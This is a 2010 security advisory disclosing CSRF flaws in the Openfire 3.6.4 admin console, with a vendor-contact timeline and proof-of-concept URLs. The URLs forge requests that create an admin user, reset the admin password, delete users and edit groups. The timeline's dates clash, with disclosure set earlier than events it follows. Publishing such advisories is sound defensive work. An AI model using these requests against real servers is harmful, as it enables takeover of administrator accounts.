@@ -1,0 +1,131 @@
+Title: Multiple CSRF Vulnerabilities in Openfire 3.6.4 Administrative
+Section
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+--
+
+Project: Openfire
+Severity: High
+Versions: 3.6.4 (other versions may be affected)
+Exploit type: Multiple CSRF
+Fixes Available: None
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+--
+
+Timeline:
+14 October 2010:  Vendor Contacted
+15 October 2010:  Vendor Response received. Asks to verify the issues in
+beta.
+28 October 2010:  Informed Vendor that multiple pages are still
+vulnerable
+03 November 2010: Acknowledgement / Update requested
+03 November 2010: Update received. No fixes initiated.
+23 November 2010: Informed vendor disclosure date set to 1/12/2010
+22 December 2010: Update requested.
+22 December 2010: Vendor asks to release information as the
+vulnerabilities are already known
+23 December 2010: A different contact at the Vendor location informs
+that there are no updates.
+24 December 2010: Disclosure date set to 5 December 2010
+05 December 2010: Public disclosure.
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+--
+
+Product Description:
+Openfire is a real time collaboration (RTC) server licensed under the
+Open Source GPL. It uses the only widely adopted open protocol for
+instant messaging, XMPP (also called Jabber). Openfire is incredibly
+easy to setup and administer, but offers rock-solid security and
+performance.
+(Source: http://www.igniterealtime.org/projects/openfire/)
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+--
+
+Affected Files/Locations/Modules:
+user-create.jsp
+user-password.jsp
+user-delete.jsp
+group-create.jsp
+group-edit.jsp
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+--
+
+Vulnerability Details:
+An attacker can execute functions as an authenticated user by tricking a
+user into making requests to the Server. The attack works by including a
+link or script in a page that accesses a site to which the user is known
+(or is supposed) to have been authenticated. Successful exploitation of
+these vulnerabilities could result in, but not limited to, compromise of
+the application, theft of cookie-based authentication credentials,
+arbitrary page redirection, disclosure or modification of sensitive data
+and phishing attacks.
+
+Since the vulnerabilities exist in the administrative module, a
+successful attack could cause a complete compromise of the entire
+application. An attacker can send a link with the exploit to an
+administrator whose access could compromise the application.
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+--
+
+Proof of Concept:
+Create a html content (img, iframes etc.) with the following PoC URLs as
+src and host for the authenticated victim.
+http://localhost:9090/user-create.jsp?username=tester&name=Riyaz&email=w
+alikarriyazad%40microland.com&password=test&passwordConfirm=test&isadmin
+=on&create=Create+User
+
+http://localhost:9090/user-create.jsp?username=tester&name=Riyaz&email=w
+alikarriyazad%40microland.com&password=test&passwordConfirm=test&isadmin
+=on&create=Create+User>
+
+http://localhost:9090/user-password.jsp?username=admin&password=secure-p
+ass&passwordConfirm=secure-pass&update=Update+Password
+
+http://localhost:9090/user-password.jsp?username=admin&password=secure-p
+ass&passwordConfirm=secure-pass&update=Update+Password>
+
+http://localhost:9090/user-delete.jsp?username=tester&delete=Delete+User
+
+http://localhost:9090/user-delete.jsp?username=tester&delete=Delete+User
+
+http://localhost:9090/group-create.jsp?name=NewGroup&description=New+Gro
+up&create=Create+Group
+
+http://localhost:9090/group-create.jsp?name=NewGroup&description=New+Gro
+up&create=Create+Group>
+
+http://localhost:9090/group-edit.jsp?group=NewGroup&add=Add&username=adm
+in&addbutton=Add
+
+http://localhost:9090/group-edit.jsp?group=NewGroup&add=Add&username=adm
+in&addbutton=Add>
+
+http://localhost:9090/group-edit.jsp?group=NewGroup&admin=abc () example co
+m&updateMember=Update
+
+http://localhost:9090/group-edit.jsp?group=NewGroup&admin=abc () example co
+m&updateMember=Update>
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+--
+
+Warm Regards,
+Riyaz Ahemed Walikar || Senior Engineer - Professional Services
+Vulnerability Assessment & Penetration Testing
+Microland Limited
+www.microland.com
+
+
+The information transmitted is intended only for the person or entity to which it is addressed and may contain 
+confidential and/or privileged material. 
+Any review, re-transmission, dissemination or other use of or taking of any action in reliance upon,this information by 
+persons or entities other than the intended recipient is prohibited. 
+If you received this in error, please contact the sender and delete the material from your computer. 
+Microland takes all reasonable steps to ensure that its electronic communications are free from viruses. 
+However, given Internet accessibility, the Company cannot accept liability for any virus introduced by this e-mail or 
+any attachment and you are advised to use up-to-date virus checking software. 
